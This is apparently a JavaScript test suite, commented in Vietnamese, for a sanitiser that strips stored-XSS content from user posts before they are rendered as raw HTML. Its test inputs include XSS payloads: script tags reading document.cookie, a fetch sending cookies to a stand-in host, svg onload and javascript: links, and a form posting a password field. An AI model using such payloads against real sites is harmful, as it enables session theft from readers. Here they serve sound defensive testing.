// Chay:  npm test        (hoac  node --test src/)
//
// Day la bo loc chan XSS luu tru: bai viet duoc chen thang vao trang doc bang
// dangerouslySetInnerHTML, nen mot the <script> lot qua la chay tren may CUA
// MOI NGUOI DOC. Vi vay tung truong hop duoi day khong phai "test cho du" -
// moi cai la mot duong tan cong da biet, va cai nao hong thi phai coi la lo
// hong chu khong phai loi hien thi.

const test = require('node:test');
const assert = require('node:assert');

const { laHtml, stripTags, cleanHtml, normalizeContent } = require('./postHtml');

// ---------------------------------------------------------------------------
// Nhan dang
// ---------------------------------------------------------------------------

test('laHtml: phan biet van ban thuong voi doan HTML', () => {
    assert.equal(laHtml('Chương 1: Mở đầu\nĐoạn văn bình thường.'), false);
    assert.equal(laHtml('Giá < 5 và x > 3 nên không phải thẻ'), false);
    assert.equal(laHtml('<p>Một đoạn</p>'), true);
    assert.equal(laHtml('<h2>Tiêu đề</h2>'), true);
});

test('chuanHoaNoiDung: van ban thuong di qua khong suy suyen', () => {
    const tho = 'Chương 1: Mở đầu\n\n- Ý thứ nhất\n- Ý thứ hai';
    assert.equal(normalizeContent(tho), tho);
});

// ---------------------------------------------------------------------------
// Chan ma chay
// ---------------------------------------------------------------------------

test('bo ca ruot cua <script>, khong chi bo cai the', () => {
    const out = cleanHtml('<p>Trước</p><script>alert(document.cookie)</script><p>Sau</p>');
    assert.equal(out.includes('alert'), false, 'ma JavaScript con nam lai trong bai');
    assert.match(out, /<p>Trước<\/p>/);
    assert.match(out, /<p>Sau<\/p>/);
});

test('bo thuoc tinh su kien', () => {
    const out = cleanHtml('<p onclick="alert(1)" onmouseover="alert(2)">Chữ</p>');
    assert.equal(out, '<p>Chữ</p>');
});

test('bo lien ket javascript: nhung giu lai chu', () => {
    const out = cleanHtml('<p>Đọc <a href="javascript:alert(1)">chỗ này</a> nhé</p>');
    assert.equal(out.includes('javascript:'), false);
    // Bo ca the thi cau van thung mot tu - phai con chu.
    assert.match(out, /chỗ này/);
});

test('bo anh dung data: URI', () => {
    // SVG trong data: URI chay duoc script, nen day la duong vao that su chu
    // khong phai truong hop ly thuyet.
    const out = cleanHtml('<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">');
    assert.equal(out.includes('data:'), false);
    assert.equal(out.includes('<img'), false, 'anh mat dia chi thi bo han');
});

test('bo khung nhung va the tao khung', () => {
    const out = cleanHtml(
        '<p>A</p><iframe src="https://ke-xau.vn"></iframe><object data="x.swf"></object><embed src="y">',
    );
    assert.equal(out, '<p>A</p>');
});

test('bo <style> - chan ca kieu che giao dien bang CSS', () => {
    const out = cleanHtml('<style>body{display:none}</style><p>Còn lại</p>');
    assert.equal(out, '<p>Còn lại</p>');
});

test('the la khong ro nguon goc thi go the nhung giu chu', () => {
    const out = cleanHtml('<div class="quang-cao"><marquee>Chữ trong thẻ lạ</marquee></div>');
    assert.match(out, /Chữ trong thẻ lạ/);
    assert.equal(out.includes('<div'), false);
    assert.equal(out.includes('<marquee'), false);
});

// ---------------------------------------------------------------------------
// Giu lai thu can giu
// ---------------------------------------------------------------------------

test('giu nguyen bo khung cua mot bai bao', () => {
    const out = cleanHtml(
        '<h2>Tiêu đề</h2><p>Đoạn <strong>đậm</strong> và <em>nghiêng</em>.</p>' +
        '<ul><li>Ý một</li><li>Ý hai</li></ul>' +
        '<figure><img src="https://cdn.vn/a.png" alt="Ảnh"><figcaption>Chú thích</figcaption></figure>',
    );
    assert.match(out, /<h2>Tiêu đề<\/h2>/);
    assert.match(out, /<strong>đậm<\/strong>/);
    assert.match(out, /<li>Ý hai<\/li>/);
    assert.match(out, /<img[^>]+src="https:\/\/cdn\.vn\/a\.png"/);
    assert.match(out, /<figcaption>Chú thích<\/figcaption>/);
});

test('lien ket ra ngoai duoc gan target va rel an toan', () => {
    const out = cleanHtml('<a href="https://vidu.vn/bai">Xem</a>');
    assert.match(out, /href="https:\/\/vidu\.vn\/bai"/);
    assert.match(out, /target="_blank"/);
    // noopener chan trang dich voi tay lai window.opener cua trang minh.
    assert.match(out, /rel="[^"]*noopener/);
});

test('bo class va style cua trang nguon', () => {
    const out = cleanHtml('<p class="detail sapo" style="color:red" data-role="content">Chữ</p>');
    assert.equal(out, '<p>Chữ</p>');
});

test('anh duoc dat tai muon', () => {
    assert.match(cleanHtml('<img src="https://cdn.vn/a.png">'), /loading="lazy"/);
});

// ---------------------------------------------------------------------------
// Don not
// ---------------------------------------------------------------------------

test('cat khoi quang cao ma khong de lai chu thua', () => {
    // Cum <zone> la cua he thong quang cao Admicro, gap khi dan bai tu bao.
    const out = cleanHtml(
        '<p>Nội dung</p><zone id="ad"><div>ADVERTISING</div></zone><p>Tiếp</p>',
    );
    assert.equal(out.includes('ADVERTISING'), false);
    assert.equal(out, '<p>Nội dung</p><p>Tiếp</p>');
});

test('bo o rong con lai sau khi loc', () => {
    const out = cleanHtml('<p>Thật</p><p></p><p>   </p><figure></figure>');
    assert.equal(out, '<p>Thật</p>');
});

test('doan chi toan quang cao thi loc xong con rong', () => {
    // Controller dua vao day de bao dung loi: "dan nham ca trang" chu khong
    // phai "chua nhap noi dung".
    assert.equal(cleanHtml('<script>x()</script><style>a{}</style>'), '');
});

test('the <a> hong khong lam lech ngan xep the', () => {
    // Doi mot the sang ten KHONG duoc phep tung lam thu vien nha ra mot the
    // dong lac giua bai (</span> tho lo sau the anh ke tiep).
    const out = cleanHtml('<a href="javascript:x">t</a><img src="https://c/a.png">');
    assert.equal(out.includes('</span>') && !out.includes('<span>'), false);
});

// ---------------------------------------------------------------------------
// stripTags
// ---------------------------------------------------------------------------

test('boThe: rut chu tran, khong dinh ten the hay dia chi anh', () => {
    const text = stripTags('<h2>Tiêu đề</h2><p>Đoạn <a href="https://x.vn">có neo</a>.</p>');
    assert.equal(text, 'Tiêu đề Đoạn có neo .');
});

test('boThe: giai ma thuc the co ban', () => {
    assert.equal(stripTags('<p>Gi&aacute; &lt; 5 &amp; &gt; 3</p>').includes('&lt;'), false);
});

// ---------------------------------------------------------------------------
// normalizeContent - cong vao
//
// Cho nay tung thung. normalizeContent chi loc khi laHtml() cho la "giong bai
// viet", ma danh sach the cua laHtml chi gom the trinh bay: khong co script,
// khong co iframe. Nen mot chuoi chi chua <script> bi coi la van ban thuong va
// duoc luu NGUYEN VEN.
//
// Luc phat hien, giao dien tinh co dung y het mot bieu thuc do nen no ve ra
// chu chu chua chay. Nhung do khong phai mot bien phap bao ve - do la hai ban
// sao o hai kho ma nguon phai giong het nhau moi an toan. Nhung test duoi day
// giu cho cong vao tu no da dong, khong con phu thuoc vao ban sao ben kia.
// ---------------------------------------------------------------------------

test('chuanHoaNoiDung: <script> dung mot minh van bi loc, du khong the nao khac', () => {
    const out = normalizeContent('<script>fetch("//xau",{body:document.cookie})</script>Tài liệu ôn thi');
    assert.equal(/<script/i.test(out), false);
    assert.equal(out.includes('document.cookie'), false);
    // Bo ca ruot chu khong chi cai the: de lai ma JavaScript nam tho lo cung
    // la hong, vi cho khac doc ra co the chay no.
    assert.equal(out, 'Tài liệu ôn thi');
});

test('chuanHoaNoiDung: iframe, svg, form dung mot minh deu bi loc', () => {
    for (const doc of [
        '<iframe src="//xau"></iframe>',
        '<svg onload=alert(1)>',
        '<form action="//xau"><input name="pw"></form>',
    ]) {
        assert.equal(normalizeContent(doc), '', `chua chan: ${doc}`);
    }
});

test('chuanHoaNoiDung: thuoc tinh on* keo ca chuoi qua bo loc', () => {
    const out = normalizeContent('<div onmouseover=alert(1)>rê chuột</div>');
    assert.equal(/onmouseover/i.test(out), false);
    assert.equal(out.includes('rê chuột'), true);
});

test('chuanHoaNoiDung: van ban thuong giu NGUYEN VAN, khong bi doi thanh thuc the', () => {
    // Neu loc tat ca thi '<' thanh '&lt;' va nguoi doc thay dung chu "&lt;"
    // tren man hinh, vi trang doc ve van ban thuong bang React chu khong dien
    // giai thuc the. Do la ly do cong vao phai co dieu kien chu khong loc bua.
    const text = 'Chương 1: Giới hạn. Xem mục 2 < 3 nhé.';
    assert.equal(normalizeContent(text), text);
});

test('chuanHoaNoiDung: HTML lanh manh khong bi cat oan', () => {
    assert.equal(
        normalizeContent('<p>Chương 1</p><strong>ôn tập</strong>'),
        '<p>Chương 1</p><strong>ôn tập</strong>'
    );
});
